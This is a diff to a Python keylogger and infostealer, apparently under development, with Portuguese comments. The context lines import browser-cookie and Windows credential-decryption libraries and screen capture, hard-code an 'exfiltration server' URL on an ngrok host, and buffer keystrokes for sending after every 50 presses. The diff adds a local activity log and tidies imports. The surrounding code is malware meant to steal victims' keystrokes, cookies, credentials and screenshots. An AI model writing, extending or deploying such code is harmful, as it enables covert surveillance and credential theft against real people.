@@ -10,13 +10,12 @@ import browser_cookie3
 import platform
 import socket
 import uuid
-import psutil
 import win32crypt  # Necessário para Windows
 from Cryptodome.Cipher import AES
 from pathlib import Path
 from PIL import ImageGrab  # Para captura de tela
 import psutil  # Já usado para informações de rede
-
+import logging
 
 
 # Configurações do servidor de exfiltração
@@ -26,6 +25,16 @@ SERVER_URL = "https://c16e-200-103-154-30.ngrok-free.app"
 BUFFER_SIZE = 50  # Envia dados após 50 teclas armazenadas
 buffer = []
 
+
+#Registra Logs
+logging.basicConfig(
+    filename="activity.log",
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
+
+def log_message(message):
+    logging.info(message)
 
 
 # Função para capturar a tela (screenshot)
@@ -337,3 +346,7 @@ if __name__ == "__main__":
 
     with Listener(on_press=on_press) as listener:
         listener.join()
+
+
+
+        
